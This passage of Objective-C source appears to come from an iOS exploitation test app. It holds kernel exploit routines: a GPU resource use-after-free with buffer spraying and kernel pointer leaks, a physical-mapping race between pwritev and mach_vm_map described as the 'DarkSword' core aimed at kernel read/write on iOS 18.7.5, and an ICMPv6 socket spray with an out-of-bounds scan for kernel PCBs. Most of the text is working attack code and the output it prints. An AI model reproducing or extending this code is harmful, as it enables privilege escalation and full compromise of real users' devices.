    // Disable Metal debug layer -- debug wrappers (MTLDebugBuffer) don't have resourceRef
    setenv("MTL_DEBUG_LAYER", "0", 1);
    setenv("MTL_CAPTURE_ENABLED", "0", 1);

    typedef id (*MTLCreateSystemDefaultDevice_t)(void);
    MTLCreateSystemDefaultDevice_t pMTLCreate = dlsym(metal, "MTLCreateSystemDefaultDevice");
    typedef kern_return_t (*IOConnectCallMethod_t)(mach_port_t, uint32_t,
        const uint64_t*, uint32_t, const void*, size_t,
        uint64_t*, uint32_t*, void*, size_t*);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    typedef kern_return_t (*IOConnectCallScalarMethod_t)(mach_port_t, uint32_t,
        const uint64_t*, uint32_t, uint64_t*, uint32_t*);
    IOConnectCallScalarMethod_t pCallScalar = dlsym(iokit, "IOConnectCallScalarMethod");
    NSLog(@"P009: pCall=%p pCallScalar=%p", pCall, pCallScalar);

    // IOGPUResourceDetachBacking = sel 0x25, scalar=resID
    typedef kern_return_t (*IOGPUResourceDetachBacking_t)(void *);
    IOGPUResourceDetachBacking_t pDetach = dlsym(iogpu, "IOGPUResourceDetachBacking");
    NSLog(@"P009: pDetach=%p pCall=%p", pDetach, pCall);
    if (!pDetach) NSLog(@"P009: WARNING -- IOGPUResourceDetachBacking not found, will use IOConnectCallMethod sel=0x25 fallback");

    id device = pMTLCreate();
    NSLog(@"P009: dlopen+dlsym done, calling MTLCreateSystemDefaultDevice...");
    if (!device) { [out appendString:@"STOP no device (restart device)\n"]; return out; }
    NSLog(@"P009: device=%p class=%s", device, object_getClassName(device));

    SEL newBufSel = sel_registerName("newBufferWithLength:options:");
    SEL resRefSel = sel_registerName("resourceRef");
    SEL contentsSel = sel_registerName("contents");

    // === Step 1: Create resource A (4096 bytes, shared) ===
    NSLog(@"P009: Step 1 - creating bufferA...");
    [out appendString:@"=== Step 1: Create resource A ===\n"];
    id bufferA = ((id(*)(id, SEL, NSUInteger, NSUInteger))objc_msgSend)(device, newBufSel, 4096, 0);
    if (!bufferA) { [out appendString:@"STOP no bufferA\n"]; return out; }
    NSLog(@"P009: bufferA=%p class=%s", bufferA, object_getClassName(bufferA));

    // Unwrap Metal debug wrappers using known ivar names from dump:
    // CaptureMTLBuffer._baseObject -> MTLDebugBuffer._common -> MTLDebugResource._baseObject -> AGXA12FamilyBuffer
    id unwrappedA = bufferA;
    SEL baseObjSel = sel_registerName("_baseObject");
    SEL commonSel = sel_registerName("_common");
    for (int i = 0; i < 6; i++) {
        NSLog(@"P009: unwrap[%d] class=%s respondsToResourceRef=%d", i, object_getClassName(unwrappedA), [unwrappedA respondsToSelector:resRefSel]);
        if ([unwrappedA respondsToSelector:resRefSel]) break;
        // Try _baseObject accessor (common across all wrapper classes)
        if ([unwrappedA respondsToSelector:baseObjSel]) {
            unwrappedA = ((id(*)(id, SEL))objc_msgSend)(unwrappedA, baseObjSel);
            NSLog(@"P009: -> _baseObject -> %p class=%s", unwrappedA, object_getClassName(unwrappedA));
            continue;
        }
        // Try _common accessor (MTLDebugBuffer -> MTLDebugResource)
        if ([unwrappedA respondsToSelector:commonSel]) {
            unwrappedA = ((id(*)(id, SEL))objc_msgSend)(unwrappedA, commonSel);
            NSLog(@"P009: -> _common -> %p class=%s", unwrappedA, object_getClassName(unwrappedA));
            continue;
        }
        // Fallback: scan ivars for _baseObject
        Ivar iv = class_getInstanceVariable(object_getClass(unwrappedA), "_baseObject");
        if (iv) {
            unwrappedA = (id)object_getIvar(unwrappedA, iv);
            NSLog(@"P009: -> ivar _baseObject -> %p class=%s", unwrappedA, object_getClassName(unwrappedA));
            continue;
        }
        NSLog(@"P009: CANNOT UNWRAP further");
        break;
    }
    NSLog(@"P009: final unwrappedA=%p class=%s", unwrappedA, object_getClassName(unwrappedA));
    [out appendFormat:@"bufferA class=%s unwrapped=%s\n", object_getClassName(bufferA), object_getClassName(unwrappedA)];

    if (![unwrappedA respondsToSelector:resRefSel]) {
        [out appendString:@"STOP: cannot unwrap to IOGPUMetalBuffer (Metal debug layer active)\n"];
        [out appendString:@"Dumping all ivars of buffer object:\n"];
        id dumpObj = bufferA;
        for (int depth = 0; depth < 3; depth++) {
            const char *cls = object_getClassName(dumpObj);
            [out appendFormat:@"[%d] class=%s\n", depth, cls];
            unsigned int ic = 0;
            Ivar *il = class_copyIvarList(object_getClass(dumpObj), &ic);
            id nextObj = nil;
            for (unsigned int j = 0; j < ic; j++) {
                const char *name = ivar_getName(il[j]);
                const char *type = ivar_getTypeEncoding(il[j]);
                [out appendFormat:@"  ivar[%s] type=%s", name, type ? type : "?"];
                if (type && type[0] == '@') {
                    id v = (id)object_getIvar(dumpObj, il[j]);
                    [out appendFormat:@" val=%p class=%s", v, v ? object_getClassName(v) : "nil"];
                    // Pick first object ivar as next to explore
                    if (v && !nextObj) nextObj = v;
                }
                [out appendString:@"\n"];
            }
            free(il);
            if (!nextObj) break;
            dumpObj = nextObj;
        }
        return out;
    }
    void *resRefA = ((void *(*)(id, SEL))objc_msgSend)(unwrappedA, resRefSel);
    if (!resRefA) { [out appendString:@"STOP no resRefA\n"]; return out; }
    void *contentsA = ((void *(*)(id, SEL))objc_msgSend)(unwrappedA, contentsSel);
    NSLog(@"P009: resRefA=%p contentsA=%p", resRefA, contentsA);

    // Dump resRefA struct (first 0x40 bytes) to verify offsets
    NSLog(@"P009: resRefA dump:");
    for (int i = 0; i < 0x40; i += 8) {
        uint64_t val = *(uint64_t *)((uint8_t *)resRefA + i);
        NSLog(@"P009:   resRefA[0x%02x] = 0x%016llx", i, val);
    }

    uint64_t gpuVAddrA = *(uint64_t *)((uint8_t *)resRefA + 0x38);
    uint32_t resIDA = *(uint32_t *)((uint8_t *)resRefA + 0x30);
    void *resConnA = *(void **)((uint8_t *)resRefA + 0x10);
    uint32_t machPortA = 0;
    if (resConnA) machPortA = *(uint32_t *)((uint8_t *)resConnA + 0x14);
    NSLog(@"P009: resIDA=0x%x gpuVAddrA=0x%llx resConnA=%p machPortA=0x%x", resIDA, gpuVAddrA, resConnA, machPortA);
    [out appendFormat:@"bufferA=%p resRefA=%p resIDA=0x%x\n", bufferA, resRefA, resIDA];
    [out appendFormat:@"contentsA=%p gpuVAddrA=0x%llx\n", contentsA, gpuVAddrA];
    [out appendFormat:@"resConnA=%p machPortA=0x%x\n", resConnA, machPortA];
    [out appendString:@"resRefA dump:\n"];
    for (int i = 0; i < 0x40; i += 8) {
        uint64_t val = *(uint64_t *)((uint8_t *)resRefA + i);
        [out appendFormat:@"  [0x%02x] 0x%016llx\n", i, val];
    }

    // Write a marker pattern to A's CPU mapping
    uint64_t marker = 0xDEADBEEFCAFEBABEULL;
    for (int i = 0; i < 4096; i += 8) {
        *(uint64_t *)((uint8_t *)contentsA + i) = marker;
    }
    [out appendFormat:@"wrote marker 0x%llx to contentsA (4096 bytes)\n", marker];

    // Verify marker
    uint64_t readBack = *(uint64_t *)contentsA;
    [out appendFormat:@"verify: contentsA[0]=0x%llx (expect 0x%llx)\n", readBack, marker];

    // === Step 2: DetachBacking on A (frees GPU backing, CPU mapping survives) ===
    NSLog(@"P009: Step 2 - calling DetachBacking...");
    [out appendString:@"\n=== Step 2: DetachBacking A ===\n"];
    kern_return_t rc;
    if (pDetach) {
        rc = pDetach(resRefA);
        NSLog(@"P009: pDetach(resRefA) rc=0x%x", rc);
    } else {
        NSLog(@"P009: pDetach is NULL -- sweeping selectors to find DetachBacking");
        [out appendFormat:@"pDetach=NULL, iogpu=%p, sweeping sel 0x20-0x30\n", iogpu];
        // Read connection info from resRefA
        void *resConn = *(void **)((uint8_t *)resRefA + 0x10);
        uint32_t machPort = 0;
        if (resConn) machPort = *(uint32_t *)((uint8_t *)resConn + 0x14);
        uint64_t scalarIn = resIDA;
        [out appendFormat:@"sweep machPort=0x%x resID=0x%x\n", machPort, resIDA];

        // Try scalar method for each selector 0x20-0x30
        if (pCallScalar) {
            [out appendString:@"scalar sweep:\n"];
            for (uint32_t sel = 0x20; sel <= 0x30; sel++) {
                kern_return_t r = pCallScalar(machPort, sel, &scalarIn, 1, NULL, NULL);
                [out appendFormat:@"  sel=0x%02x rc=0x%x\n", sel, r];
                NSLog(@"P009: sweep scalar sel=0x%02x rc=0x%x", sel, r);
            }
        }
        // Also try struct input (8 bytes = resID as struct) for sel 0x24-0x28
        if (pCall) {
            [out appendString:@"struct sweep:\n"];
            uint8_t structIn[8] = {0};
            *(uint64_t *)structIn = resIDA;
            for (uint32_t sel = 0x24; sel <= 0x28; sel++) {
                kern_return_t r = pCall(machPort, sel, NULL, 0, structIn, 8, NULL, NULL, NULL, NULL);
                [out appendFormat:@"  sel=0x%02x rc=0x%x\n", sel, r];
                NSLog(@"P009: sweep struct sel=0x%02x rc=0x%x", sel, r);
            }
        }
        // For now, use sel=0x25 scalar as the "detach" attempt
        rc = pCallScalar ? pCallScalar(machPort, 0x25, &scalarIn, 1, NULL, NULL) : 0xe00002c2;
        [out appendFormat:@"using sel=0x25 scalar rc=0x%x\n", rc];
    }
    NSLog(@"P009: DetachBacking rc=0x%x", rc);
    [out appendFormat:@"DetachBacking(resRefA) rc=0x%x\n", rc];

    // Check if CPU mapping still works after detach
    NSLog(@"P009: reading contentsA after detach...");
    readBack = *(uint64_t *)contentsA;
    NSLog(@"P009: contentsA[0]=0x%llx after detach", readBack);
    [out appendFormat:@"after detach: contentsA[0]=0x%llx\n", readBack];

    // Read gpuVAddr after detach (UAF read on kernel pointer)
    uint64_t gpuVAddrAfterDetach = *(uint64_t *)((uint8_t *)resRefA + 0x38);
    [out appendFormat:@"gpuVAddr after detach=0x%llx (was 0x%llx)\n", gpuVAddrAfterDetach, gpuVAddrA];

    // === Step 3: Create resource B (SAME type, SAME size = 4096) ===
    // The GPU allocator may reuse A's freed page for B
    NSLog(@"P009: Step 3 - creating 10 new buffers (same type+size)...");
    [out appendString:@"\n=== Step 3: Create resources B,C,D... (same type+size) ===\n"];

    void *contentsArray[256] = {0};
    void *resRefArray[256] = {0};
    uint64_t gpuVAddrArray[256] = {0};
    int numB = 200;

    for (int i = 0; i < numB; i++) {
        id bufB = ((id(*)(id, SEL, NSUInteger, NSUInteger))objc_msgSend)(device, newBufSel, 4096, 0);
        if (!bufB) { [out appendFormat:@"buf[%d] FAILED\n", i]; continue; }
        // Unwrap via _baseObject / _common
        id unwrappedB = bufB;
        for (int j = 0; j < 6; j++) {
            if ([unwrappedB respondsToSelector:resRefSel]) break;
            if ([unwrappedB respondsToSelector:baseObjSel]) { unwrappedB = ((id(*)(id, SEL))objc_msgSend)(unwrappedB, baseObjSel); continue; }
            if ([unwrappedB respondsToSelector:commonSel]) { unwrappedB = ((id(*)(id, SEL))objc_msgSend)(unwrappedB, commonSel); continue; }
            Ivar iv2 = class_getInstanceVariable(object_getClass(unwrappedB), "_baseObject");
            if (iv2) { unwrappedB = (id)object_getIvar(unwrappedB, iv2); continue; }
            break;
        }
        void *resRefB = ((void *(*)(id, SEL))objc_msgSend)(unwrappedB, resRefSel);
        void *contentsB = ((void *(*)(id, SEL))objc_msgSend)(unwrappedB, contentsSel);
        uint64_t gpuVAddrB = *(uint64_t *)((uint8_t *)resRefB + 0x38);
        contentsArray[i] = contentsB;
        resRefArray[i] = resRefB;
        gpuVAddrArray[i] = gpuVAddrB;
        [out appendFormat:@"buf[%d]=%p resRef=%p contents=%p gpuVA=0x%llx\n",
            i, bufB, resRefB, contentsB, gpuVAddrB];
    }

    // === Step 4: Check if A's stale CPU mapping now shows B's data ===
    NSLog(@"P009: Step 4 - checking A's stale mapping for reuse...");
    [out appendString:@"\n=== Step 4: Check A's stale mapping for reuse ===\n"];

    // Read A's stale mapping -- if it shows something other than our marker,
    // the page was reused by a new resource
    readBack = *(uint64_t *)contentsA;
    [out appendFormat:@"A's stale mapping[0]=0x%llx (marker was 0x%llx)\n", readBack, marker];

    if (readBack != marker) {
        [out appendString:@"*** REUSE DETECTED! A's page was reused! ***\n"];

        // Check if it matches any of B's contents
        for (int i = 0; i < numB; i++) {
            if (!contentsArray[i]) continue;
            uint64_t bVal = *(uint64_t *)contentsArray[i];
            [out appendFormat:@"buf[%d] contents[0]=0x%llx", i, bVal];
            if (bVal == readBack) {
                [out appendString:@" *** MATCHES A's stale mapping! ***"];
            }
            [out appendString:@"\n"];
        }

        // Check if A's stale mapping matches any B's gpuVAddr region
        [out appendFormat:@"\nA stale[0..7]: "];
        for (int i = 0; i < 8; i++) [out appendFormat:@"%02x ", ((uint8_t *)contentsA)[i]];
        [out appendString:@"\n"];

        // Try to read what looks like kernel pointers from A's stale mapping
        [out appendString:@"\nA stale mapping first 64 bytes (potential kernel pointers):\n"];
        for (int i = 0; i < 64; i += 8) {
            uint64_t val = *(uint64_t *)((uint8_t *)contentsA + i);
            [out appendFormat:@"  [%3d] 0x%016llx\n", i, val];
        }

        // Try writing through A's stale mapping and check if B sees it
        [out appendString:@"\n=== Step 5: Write through A's stale mapping ===\n"];
        uint64_t testWrite = 0x4141414141414141ULL;
        *(uint64_t *)contentsA = testWrite;
        [out appendFormat:@"wrote 0x%llx through A's stale mapping\n", testWrite];

        for (int i = 0; i < numB; i++) {
            if (!contentsArray[i]) continue;
            uint64_t bVal = *(uint64_t *)contentsArray[i];
            [out appendFormat:@"buf[%d] contents[0]=0x%llx", i, bVal];
            if (bVal == testWrite) {
                [out appendString:@" *** CONFIRMED: A's stale write is visible in B! ***"];
            }
            [out appendString:@"\n"];
        }

        // Read B's resourceRef fields through A's stale mapping
        // If A's page now backs B's IOGPUResource kernel object, we can read it
        [out appendString:@"\n=== Step 6: Read kernel object fields through A ===\n"];
        for (int i = 0; i < 64; i += 8) {
            uint64_t val = *(uint64_t *)((uint8_t *)contentsA + i);
            [out appendFormat:@"kobj[%3d] = 0x%016llx\n", i, val];
        }
    } else {
        [out appendString:@"NO reuse -- A's marker still intact\n"];

        // Aggressive approach: detach 50 more resources, then spray 200 more
        [out appendString:@"\n=== Aggressive: detach 50, spray 200 ===\n"];
        id detachBufs[50] = {0};
        for (int i = 0; i < 50; i++) {
            id bufD = ((id(*)(id, SEL, NSUInteger, NSUInteger))objc_msgSend)(device, newBufSel, 4096, 0);
            if (!bufD) continue;
            id unwrappedD = bufD;
            for (int j = 0; j < 6; j++) {
                if ([unwrappedD respondsToSelector:resRefSel]) break;
                if ([unwrappedD respondsToSelector:baseObjSel]) { unwrappedD = ((id(*)(id, SEL))objc_msgSend)(unwrappedD, baseObjSel); continue; }
                if ([unwrappedD respondsToSelector:commonSel]) { unwrappedD = ((id(*)(id, SEL))objc_msgSend)(unwrappedD, commonSel); continue; }
                Ivar iv4 = class_getInstanceVariable(object_getClass(unwrappedD), "_baseObject");
                if (iv4) { unwrappedD = (id)object_getIvar(unwrappedD, iv4); continue; }
                break;
            }
            void *resRefD = ((void *(*)(id, SEL))objc_msgSend)(unwrappedD, resRefSel);
            if (pDetach && resRefD) {
                pDetach(resRefD);
            }
            detachBufs[i] = bufD;
        }
        [out appendFormat:@"detached 50 resources, now spraying 200...\n"];
        // Now spray 200 new resources
        int reuseFound = 0;
        for (int i = 0; i < 200; i++) {
            id bufE = ((id(*)(id, SEL, NSUInteger, NSUInteger))objc_msgSend)(device, newBufSel, 4096, 0);
            if (!bufE) continue;
            // Check A's stale mapping after each allocation
            readBack = *(uint64_t *)contentsA;
            if (readBack != marker && !reuseFound) {
                reuseFound = 1;
                [out appendFormat:@"*** REUSE at spray %d! A stale[0]=0x%llx ***\n", i, readBack];
                // Dump A's stale mapping
                for (int k = 0; k < 64; k += 8) {
                    uint64_t val = *(uint64_t *)((uint8_t *)contentsA + k);
                    [out appendFormat:@"  stale[%3d] = 0x%016llx\n", k, val];
                }
            }
        }
        if (!reuseFound) {
            [out appendString:@"NO reuse after 200 spray\n"];
        }
        readBack = *(uint64_t *)contentsA;
        [out appendFormat:@"final A stale[0]=0x%llx\n", readBack];
    }

    // === Step 7: Also check gpuVAddr UAF (info leak) ===
    [out appendString:@"\n=== Step 7: GPU vaddr UAF info leak ===\n"];
    uint64_t gpuVAddrFinal = *(uint64_t *)((uint8_t *)resRefA + 0x38);
    [out appendFormat:@"resRefA[0x38] final=0x%llx (original=0x%llx)\n", gpuVAddrFinal, gpuVAddrA];
    if (gpuVAddrFinal != gpuVAddrA && gpuVAddrFinal != 0) {
        [out appendFormat:@"*** CHANGED -- kernel pointer in freed memory! ***\n"];
        [out appendFormat:@"*** This is a kernel info leak: 0x%llx ***\n", gpuVAddrFinal];
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

+ (NSString *)runPhysOOBTest {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"Phys OOB race test (DarkSword core) on 18.7.5\n\n"];

    void *iogsurface = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    IOSurfaceCreate_t pSurfCreate = dlsym(iogsurface, "IOSurfaceCreate");
    IOSurfaceGetBaseAddress_t pSurfGetBase = dlsym(iogsurface, "IOSurfaceGetBaseAddress");
    IOSurfaceGetAllocSize_t pSurfGetAlloc = dlsym(iogsurface, "IOSurfaceGetAllocSize");

    if (!pSurfCreate || !pSurfGetBase) {
        [out appendString:@"STOP no IOSurface\n"];
        return out;
    }

    // Step 1: Create physically contiguous mapping via IOSurface "PurpleGfxMem"
    [out appendString:@"=== Step 1: PurpleGfxMem surface ===\n"];
    uint64_t pcSize = 2 * 4096; // 2 pages -- free thread remap size (DarkSword uses this)
    NSDictionary *params = @{
        @"IOSurfaceAllocSize": @(pcSize),
        @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
    };
    IOSurfaceRef surface = pSurfCreate((__bridge CFDictionaryRef)params);
    if (!surface) {
        [out appendString:@"STOP no surface (PurpleGfxMem not available)\n"];
        return out;
    }
    void *physAddr = pSurfGetBase(surface);
    [out appendFormat:@"surface=%p physAddr=%p\n", surface, physAddr];

    // Create memory entry from the physical mapping
    mach_port_t pcObject = 0;
    mach_vm_size_t moSize = pcSize;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &moSize,
                        (mach_vm_address_t)physAddr, VM_PROT_DEFAULT, &pcObject, 0);
    if (kr != KERN_SUCCESS) {
        [out appendFormat:@"STOP mach_make_memory_entry: 0x%x\n", kr];
        CFRelease(surface);
        return out;
    }
    [out appendFormat:@"pcObject=%u moSize=%llu (pcSize=%llu)\n", pcObject, moSize, pcSize];

    // Map it to a new address -- use moSize (actual backing size) not pcSize
    mach_vm_address_t pcAddress = 0;
    kr = mach_vm_map(mach_task_self(), &pcAddress, moSize, 0,
                     VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR,
                     pcObject, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        [out appendFormat:@"STOP mach_vm_map: 0x%x\n", kr];
        mach_port_deallocate(mach_task_self(), pcObject);
        CFRelease(surface);
        return out;
    }
    [out appendFormat:@"pcAddress=0x%llx\n", pcAddress];

    // Set random marker
    uint64_t randomMarker = ((uint64_t)arc4random() << 32) | arc4random();
    uint8_t *pcPtr = (uint8_t *)pcAddress;
    for (uint64_t i = 0; i < pcSize; i += sizeof(uint64_t)) {
        *(uint64_t *)(pcPtr + i) = randomMarker;
    }
    [out appendFormat:@"marker=0x%llx\n", randomMarker];

    // Step 2: Create temp files with F_NOCACHE
    [out appendString:@"\n=== Step 2: temp files ===\n"];
    char tmpPath[1024];
    confstr(_CS_DARWIN_USER_TEMP_DIR, tmpPath, sizeof(tmpPath));
    char readFile[1100], writeFile[1100];
    snprintf(readFile, sizeof(readFile), "%s%u", tmpPath, arc4random());
    snprintf(writeFile, sizeof(writeFile), "%s%u", tmpPath, arc4random());

    FILE *f = fopen(readFile, "w");
    uint64_t fileSize = 0x8000;
    uint8_t *zeroBuf = calloc(1, fileSize);
    fwrite(zeroBuf, 1, fileSize, f);
    fclose(f);
    f = fopen(writeFile, "w");
    fwrite(zeroBuf, 1, fileSize, f);
    fclose(f);
    free(zeroBuf);

    int readFd = open(readFile, O_RDWR);
    int writeFd = open(writeFile, O_RDWR);
    fcntl(readFd, F_NOCACHE, 1);
    fcntl(writeFd, F_NOCACHE, 1);
    remove(readFile);
    remove(writeFile);
    [out appendFormat:@"readFd=%d writeFd=%d\n", readFd, writeFd];

    // Step 3: Race pwritev with mach_vm_map
    [out appendString:@"\n=== Step 3: race pwritev vs mach_vm_map ===\n"];
    [out appendString:@"500 iterations. OOB read = race HIT.\n\n"];

    // Free thread: continuously remaps pcAddress to a different memory object
    // We use a simple memory object (anonymous vm_allocate) as the "target"
    __block volatile int raceSync = 0;
    __block volatile int goSync = 0;
    __block volatile int freeThreadStart = 0;
    mach_vm_address_t targetAddr = 0;
    mach_vm_size_t targetSize = pcSize;
    kr = mach_vm_allocate(mach_task_self(), &targetAddr, targetSize, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        [out appendFormat:@"STOP vm_allocate target: 0x%x\n", kr];
        return out;
    }
    // Fill target with a different pattern
    memset((void *)targetAddr, 0x41, targetSize);
    mach_port_t targetObject = 0;
    mach_vm_size_t targetMoSize = targetSize;
    kr = mach_make_memory_entry_64(mach_task_self(), &targetMoSize,
                        targetAddr, VM_PROT_DEFAULT, &targetObject, 0);
    [out appendFormat:@"targetObject=%u targetAddr=0x%llx\n", targetObject, targetAddr];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
        while (freeThreadStart == 0);
        while (goSync == 0);
        while (goSync != 0) {
            while (raceSync == 0);
            mach_vm_address_t addr = pcAddress;
            mach_vm_map(mach_task_self(), &addr, pcSize, 0,
                        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                        targetObject, 0, false,
                        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            raceSync = 0;
        }
    });

    freeThreadStart = 1;
    goSync = 1;

    struct iovec iov;
    iov.iov_base = (void *)(pcAddress + 0x3f00);
    iov.iov_len = 0x100; // OOB offset

    int raceHits = 0;
    for (int iter = 0; iter < 500; iter++) {
        // Restore pc mapping
        mach_vm_address_t addr = pcAddress;
        mach_vm_map(mach_task_self(), &addr, pcSize, 0,
                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                    pcObject, 0, false,
                    VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);

        // Set marker at OOB location
        *(uint64_t *)(pcPtr + 0x3f00) = randomMarker;

        // Race: pwritev reads from pcAddress, free thread remaps it
        raceSync = 1;
        ssize_t w = pwritev(readFd, &iov, 1, 0x3f00);
        while (raceSync == 1);

        // Restore pc mapping
        addr = pcAddress;
        mach_vm_map(mach_task_self(), &addr, pcSize, 0,
                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                    pcObject, 0, false,
                    VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);

        if (w == -1) {
            // pwritev failed = race hit (mapping changed mid-flight)
            // Read back from file to see what we got
            uint8_t readBuf[0x100];
            pread(readFd, readBuf, 0x100, 0x3f00);
            uint64_t marker = *(uint64_t *)readBuf;
            if (marker != randomMarker) {
                raceHits++;
                if (raceHits <= 5) {
                    [out appendFormat:@"iter %d: RACE HIT! marker=0x%llx (expected 0x%llx)\n",
                     iter, marker, randomMarker];
                }
            }
        }

        if (iter % 100 == 0) {
            [out appendFormat:@"iter %d: hits=%d\n", iter, raceHits];
        }
    }

    goSync = 0;
    raceSync = 1;
    usleep(10000);

    [out appendFormat:@"\n=== RESULT ===\n"];
    [out appendFormat:@"race hits: %d/500\n", raceHits];
    if (raceHits > 0) {
        [out appendString:@"RACE WORKS! DarkSword/ClearSword core vulnerability is UNPATCHED on 18.7.5.\n"];
        [out appendString:@"Can port DarkSword for full KRW.\n"];
    } else {
        [out appendString:@"No race hits. Vulnerability may be patched on 18.7.5.\n"];
        [out appendString:@"Continue with P010 or P001 AVE path.\n"];
    }

    // Cleanup
    mach_vm_deallocate(mach_task_self(), pcAddress, pcSize);
    mach_vm_deallocate(mach_task_self(), targetAddr, targetSize);
    mach_port_deallocate(mach_task_self(), pcObject);
    mach_port_deallocate(mach_task_self(), targetObject);
    close(readFd);
    close(writeFd);
    CFRelease(surface);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

+ (NSString *)runLuminaSprayScan {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"Lumina step 1: socket spray + OOB scan for PCBs\n\n"];

    void *iogsurface = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    IOSurfaceCreate_t pSurfCreate = dlsym(iogsurface, "IOSurfaceCreate");
    IOSurfaceGetBaseAddress_t pSurfGetBase = dlsym(iogsurface, "IOSurfaceGetBaseAddress");

    if (!pSurfCreate || !pSurfGetBase) {
        [out appendString:@"STOP no IOSurface\n"];
        return out;
    }

    // Step 1: Create physically contiguous mapping
    [out appendString:@"=== Step 1: PurpleGfxMem mapping ===\n"];
    uint64_t pcSize = 2 * 4096; // 2 pages -- free thread remap size (DarkSword uses this)
    NSDictionary *params = @{
        @"IOSurfaceAllocSize": @(pcSize),
        @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
    };
    IOSurfaceRef surface = pSurfCreate((__bridge CFDictionaryRef)params);
    if (!surface) { [out appendString:@"STOP no surface\n"]; return out; }
    void *physAddr = pSurfGetBase(surface);

    mach_port_t pcObject = 0;
    mach_vm_size_t moSize = pcSize;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &moSize,
                        (mach_vm_address_t)physAddr, VM_PROT_DEFAULT, &pcObject, 0);
    if (kr != KERN_SUCCESS) { [out appendFormat:@"STOP mem_entry: 0x%x\n", kr]; CFRelease(surface); return out; }
    [out appendFormat:@"moSize=%llu (pcSize=%llu)\n", moSize, pcSize];

    mach_vm_address_t pcAddress = 0;
    kr = mach_vm_map(mach_task_self(), &pcAddress, moSize, 0,
                     VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR,
                     pcObject, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { [out appendFormat:@"STOP vm_map: 0x%x\n", kr]; return out; }

    uint64_t randomMarker = ((uint64_t)arc4random() << 32) | arc4random();
    uint8_t *pcPtr = (uint8_t *)pcAddress;
    for (uint64_t i = 0; i < pcSize; i += sizeof(uint64_t))
        *(uint64_t *)(pcPtr + i) = randomMarker;
    [out appendFormat:@"pcAddress=0x%llx marker=0x%llx\n", pcAddress, randomMarker];

    // Step 2: Create temp files
    char tmpPath[1024];
    confstr(_CS_DARWIN_USER_TEMP_DIR, tmpPath, sizeof(tmpPath));
    char readFile[1100], writeFile[1100];
    snprintf(readFile, sizeof(readFile), "%s%u", tmpPath, arc4random());
    snprintf(writeFile, sizeof(writeFile), "%s%u", tmpPath, arc4random());
    uint64_t fileSize = 0x8000; // must cover 0x3f00+0x1000 write offset
    uint8_t *zeroBuf = calloc(1, fileSize);
    FILE *f = fopen(readFile, "w"); fwrite(zeroBuf, 1, fileSize, f); fclose(f);
    f = fopen(writeFile, "w"); fwrite(zeroBuf, 1, fileSize, f); fclose(f);
    free(zeroBuf);
    int readFd = open(readFile, O_RDWR); int writeFd = open(writeFile, O_RDWR);
    fcntl(readFd, F_NOCACHE, 1); fcntl(writeFd, F_NOCACHE, 1);
    remove(readFile); remove(writeFile);

    // Step 3: Spray ICMPv6 sockets
    [out appendString:@"\n=== Step 3: spray ICMPv6 sockets ===\n"];
    #define IPPROTO_ICMPV6 58
    #define ICMP6_FILTER 18
    #define MAX_SOCKETS 10000

    NSMutableArray *socketPorts = [NSMutableArray new];
    int sprayCount = 0;
    for (int i = 0; i < MAX_SOCKETS; i++) {
        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        if (fd == -1) break;
        fileport_t port = 0;
        fileport_makeport(fd, &port);
        close(fd);
        [socketPorts addObject:@(port)];
        sprayCount++;
    }
    [out appendFormat:@"sprayed %d sockets\n", sprayCount];

    // Step 4: Create search mappings + scan OOB for PCBs
    [out appendString:@"\n=== Step 4: OOB scan for PCBs ===\n"];

    // Free thread setup
    __block volatile int raceSync = 0;
    __block volatile int goSync = 0;
    __block volatile mach_port_t targetObject_sync = 0;
    __block volatile mach_vm_offset_t targetObjectOffset_sync = 0;
    __block mach_vm_address_t freeTarget = pcAddress;
    __block mach_vm_size_t freeTargetSize = pcSize;

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
        while (goSync == 0);
        while (goSync != 0) {
            while (raceSync == 0);
            mach_vm_address_t addr = freeTarget;
            mach_port_t to = targetObject_sync;
            mach_vm_offset_t toff = targetObjectOffset_sync;
            if (to) {
                mach_vm_map(mach_task_self(), &addr, freeTargetSize, 0,
                            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                            to, toff, false,
                            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            }
            raceSync = 0;
        }
    });

    // Create search mappings
    uint64_t searchMappingSize = 0x2000 * 4096; // 32MB
    int numSearchMappings = 8;
    mach_vm_address_t searchMappings[8];
    mach_port_t searchMOs[8];

    for (int s = 0; s < numSearchMappings; s++) {
        searchMappings[s] = 0;
        kr = mach_vm_allocate(mach_task_self(), &searchMappings[s], searchMappingSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) { [out appendFormat:@"vm_allocate failed for mapping %d\n", s]; continue; }
